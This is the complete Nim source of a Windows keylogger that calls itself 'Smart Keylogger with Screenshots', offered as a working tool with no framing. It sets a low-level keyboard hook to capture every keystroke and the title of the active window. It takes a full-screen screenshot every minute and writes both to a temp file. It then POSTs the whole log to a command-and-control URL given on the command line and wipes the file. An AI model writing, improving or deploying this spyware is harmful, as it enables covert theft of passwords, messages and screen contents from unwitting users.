import winim
import base64
import streams
import os
import puppy

# --- GDI+ Definitions ---

type
  GdiplusStartupInput* = object
    GdiplusVersion*: UINT32
    DebugEventCallback*: pointer
    SuppressBackgroundThread*: BOOL
    SuppressExternalCodecs*: BOOL

  GdiplusStartupOutput* = object
    NotificationHook*: pointer
    NotificationUnhook*: pointer

  ImageCodecInfo* = object
    Clsid*: CLSID
    FormatID*: GUID
    CodecName*: ptr WCHAR
    DllName*: ptr WCHAR
    FormatDescription*: ptr WCHAR
    FilenameExtension*: ptr WCHAR
    MimeType*: ptr WCHAR
    Flags*: DWORD
    Version*: DWORD
    SigCount*: DWORD
    SigSize*: DWORD
    SigPattern*: ptr BYTE
    SigMask*: ptr BYTE

  GpBitmap* = pointer
  GpStatus* = int32

# Define GDI+ functions dynamically
proc GdiplusStartup*(token: ptr ULONG_PTR, input: ptr GdiplusStartupInput, output: ptr GdiplusStartupOutput): GpStatus {.stdcall, dynlib: "gdiplus.dll", importc.}
proc GdiplusShutdown*(token: ULONG_PTR): void {.stdcall, dynlib: "gdiplus.dll", importc.}
proc GdipCreateBitmapFromHBITMAP*(hbm: HBITMAP, hpal: HPALETTE, bitmap: ptr GpBitmap): GpStatus {.stdcall, dynlib: "gdiplus.dll", importc.}
proc GdipDisposeImage*(image: GpBitmap): GpStatus {.stdcall, dynlib: "gdiplus.dll", importc.}
proc GdipSaveImageToStream*(image: GpBitmap, stream: ptr IStream, clsidEncoder: ptr CLSID, encoderParams: pointer): GpStatus {.stdcall, dynlib: "gdiplus.dll", importc.}
proc GetImageEncodersSize*(numEncoders: ptr UINT, size: ptr UINT): GpStatus {.stdcall, dynlib: "gdiplus.dll", importc: "GdipGetImageEncodersSize".}
proc GetImageEncoders*(numEncoders: UINT, size: UINT, encoders: ptr ImageCodecInfo): GpStatus {.stdcall, dynlib: "gdiplus.dll", importc: "GdipGetImageEncoders".}

# --- Globals ---

var 
    hHook: HHOOK
    buffer: string = ""
    lastWindow: string = ""
    logFile: File

# --- Helpers ---

proc log(text: string) =
    try:
        logFile.write(text)
        logFile.flushFile()
    except IOError:
        discard
    stdout.write(text)
    stdout.flushFile()

proc getActiveWindowTitle(): string =
    var hwnd = GetForegroundWindow()
    var len = GetWindowTextLength(hwnd)
    if len > 0:
        var buff = newString(len + 1)
        discard GetWindowTextA(hwnd, buff.cstring, int32(len + 1))
        return $buff.cstring
    return "Unknown"

proc flushBuffer() =
    if buffer.len > 0:
        log(buffer)
        buffer = ""

proc checkWindowChange() =
    let currentWindow = getActiveWindowTitle()
    if currentWindow != lastWindow:
        flushBuffer()
        lastWindow = currentWindow
        log("\n[Window: " & lastWindow & "]\n")

# --- Screenshot ---

proc GetEncoderClsid(format: string, clsid: ptr CLSID): int32 =
    var num: UINT
    var size: UINT
    
    discard GetImageEncodersSize(addr num, addr size)
    if size == 0: return -1
    
    var pImageCodecInfo = cast[ptr ImageCodecInfo](alloc(size))
    if pImageCodecInfo == nil: return -1
    
    discard GetImageEncoders(num, size, pImageCodecInfo)
    
    for i in 0 ..< int(num):
        let codec = cast[ptr ImageCodecInfo](cast[ByteAddress](pImageCodecInfo) + i * sizeof(ImageCodecInfo))
        
        let mime = $cast[WideCString](codec.MimeType)
        if mime == format:
            clsid[] = codec.Clsid
            dealloc(pImageCodecInfo)
            return i.int32
            
    dealloc(pImageCodecInfo)
    return -1

proc takeScreenshotBase64(): string =
    let hDesktopWnd = GetDesktopWindow()
    let hDesktopDC = GetDC(hDesktopWnd)
    let hCaptureDC = CreateCompatibleDC(hDesktopDC)
    
    let nScreenWidth = GetSystemMetrics(SM_CXSCREEN)
    let nScreenHeight = GetSystemMetrics(SM_CYSCREEN)
    
    let hCaptureBitmap = CreateCompatibleBitmap(hDesktopDC, nScreenWidth, nScreenHeight)
    SelectObject(hCaptureDC, hCaptureBitmap)
    
    BitBlt(hCaptureDC, 0, 0, nScreenWidth, nScreenHeight, hDesktopDC, 0, 0, SRCCOPY)
    
    var bitmap: GpBitmap
    discard GdipCreateBitmapFromHBITMAP(hCaptureBitmap, 0, addr bitmap)
    
    var stream: ptr IStream
    discard CreateStreamOnHGlobal(0, TRUE, cast[ptr LPSTREAM](addr stream))
    
    var clsid: CLSID
    if GetEncoderClsid("image/png", addr clsid) != -1:
        discard GdipSaveImageToStream(bitmap, stream, addr clsid, nil)
    
    var hGlobal: HGLOBAL
    GetHGlobalFromStream(stream, addr hGlobal)
    let size = GlobalSize(hGlobal)
    let pData = GlobalLock(hGlobal)
    
    var pngData = newString(size)
    copyMem(addr pngData[0], pData, size)
    
    GlobalUnlock(hGlobal)
    
    stream.Release()
    discard GdipDisposeImage(bitmap)
    DeleteObject(hCaptureBitmap)
    DeleteDC(hCaptureDC)
    ReleaseDC(hDesktopWnd, hDesktopDC)
    
    return encode(pngData)

type
  ThreadArgs = object
    c2Url: string
    logPath: string

proc screenshotThread(args: ThreadArgs) {.thread.} =
    while true:
        Sleep(60000) # 1 minutes
        
        let b64 = takeScreenshotBase64()
        
        # Write screenshot to log file
        try:
            var f = open(args.logPath, fmAppend)
            f.write("\n[SCREENSHOT_START]\n")
            f.write(b64)
            f.write("\n[SCREENSHOT_END]\n")
            f.close()
        except IOError:
            discard
        
        echo "\n[SCREENSHOT_START]\n", b64, "\n[SCREENSHOT_END]\n"
        
        # Exfiltrate if URL is set
        if args.c2Url.len > 0:
            try:
                # Read entire log file
                let dataToSend = readFile(args.logPath)
                
                # Send via POST
                discard post(args.c2Url, body = dataToSend)
                echo "[+] Exfiltrated ", dataToSend.len, " bytes"
                
                # Clear log file after successful send
                var f = open(args.logPath, fmWrite)
                f.close()
            except IOError as e:
                echo "[-] File error: ", e.msg
            except PuppyError as e:
                echo "[-] Exfiltration failed: ", e.msg

# --- Hook ---

proc KeyboardHook(nCode: int32, wParam: WPARAM, lParam: LPARAM): LRESULT {.stdcall.} =
    if nCode >= 0:
        if wParam == WM_KEYDOWN or wParam == WM_SYSKEYDOWN:
            checkWindowChange()
            
            let kbdStruct = cast[PKBDLLHOOKSTRUCT](lParam)
            let vkCode = kbdStruct.vkCode
            
            let ctrlDown = (GetKeyState(VK_CONTROL) and 0x8000) != 0
            let altDown = (GetKeyState(VK_MENU) and 0x8000) != 0
            
            if ctrlDown or altDown:
                flushBuffer()
                var keyName = newString(128)
                let scanCode = kbdStruct.scanCode
                let msg = 1 + (scanCode shl 16) + (if (kbdStruct.flags and LLKHF_EXTENDED) != 0: 1 shl 24 else: 0)
                let len = GetKeyNameTextA(cast[LONG](msg), keyName.cstring, 128)
                keyName.setLen(len)
                
                var combo = "["
                if ctrlDown: combo.add("CTRL+")
                if altDown: combo.add("ALT+")
                combo.add(keyName)
                combo.add("]")
                log(combo)
                return CallNextHookEx(hHook, nCode, wParam, lParam)

            if vkCode == VK_BACK:
                if buffer.len > 0:
                    buffer.setLen(buffer.len - 1)
                return CallNextHookEx(hHook, nCode, wParam, lParam)
                
            if vkCode == VK_RETURN:
                flushBuffer()
                log("\n[ENTER]\n")
                return CallNextHookEx(hHook, nCode, wParam, lParam)
                
            if vkCode == VK_TAB:
                flushBuffer()
                log("[TAB]")
                return CallNextHookEx(hHook, nCode, wParam, lParam)
                
            if vkCode == VK_ESCAPE:
                flushBuffer()
                log("[ESC]")
                return CallNextHookEx(hHook, nCode, wParam, lParam)

            var keyState: array[256, byte]
            GetKeyboardState(addr keyState[0])
            
            var buff = newSeq[WCHAR](16)
            let res = ToUnicode(vkCode, kbdStruct.scanCode, addr keyState[0], cast[LPWSTR](addr buff[0]), 16, 0)
            
            if res > 0:
                if res < 16:
                    buff[res] = 0
                let charUtf8 = $cast[LPWSTR](addr buff[0])
                if charUtf8.len > 0:
                    buffer.add(charUtf8)

    return CallNextHookEx(hHook, nCode, wParam, lParam)

proc main() =
    # Parse CLI argument for C2 URL
    var c2Url = ""
    if paramCount() >= 1:
        c2Url = paramStr(1)
        echo "[*] C2 URL: ", c2Url
    else:
        echo "[*] No C2 URL provided, logging locally only"
    
    echo "[*] Starting Smart Keylogger with Screenshots..."
    
    # Open log file
    let logPath = getTempDir() / "keylog.txt"
    try:
        logFile = open(logPath, fmAppend)
        echo "[*] Logging to: ", logPath
    except IOError:
        echo "[-] Failed to open log file"
        return
    
    # Initialize GDI+
    var token: ULONG_PTR
    var startupInput: GdiplusStartupInput
    startupInput.GdiplusVersion = 1
    discard GdiplusStartup(addr token, addr startupInput, nil)
    
    lastWindow = getActiveWindowTitle()
    log("[Window: " & lastWindow & "]\n")
    
    # Start Screenshot Thread
    var thread: Thread[ThreadArgs]
    var args = ThreadArgs(c2Url: c2Url, logPath: logPath)
    createThread(thread, screenshotThread, args)
    
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHook, 0, 0)
    
    if hHook == 0:
        echo "[-] Failed to install hook"
        return
        
    var msg: MSG
    while GetMessage(addr msg, 0, 0, 0) != 0:
        TranslateMessage(addr msg)
        DispatchMessage(addr msg)
        
    UnhookWindowsHookEx(hHook)
    GdiplusShutdown(token)
    logFile.close()

main()
